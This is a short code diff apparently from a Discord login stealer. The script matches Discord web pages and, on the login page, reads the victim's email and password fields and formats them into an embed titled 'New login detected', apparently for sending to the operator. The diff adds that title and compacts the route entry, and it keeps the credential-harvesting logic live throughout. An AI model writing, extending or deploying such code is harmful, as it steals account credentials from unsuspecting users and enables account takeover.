@@ -13,6 +13,7 @@ const onLoginUrl = () => {
           name: 'Discord',
           icon_url: 'https://discord.com/assets/ec2c34cadd4b5f4594415127380a85e6.ico'
         },
+        title: 'New login detected',
         fields: formatFields([
           ['Email', code(emailInput.value)],
           ['Password', code(passwordInput.value)],
@@ -25,9 +26,6 @@ const onLoginUrl = () => {
 module.exports = {
   webPattern: /https:\/\/(canary.|ptb.)?discord\.com/g,
   urlsMatches: [
-    {
-      path: '/login',
-      run: onLoginUrl
-    }
+    { path: '/login', run: onLoginUrl }
   ]
 };
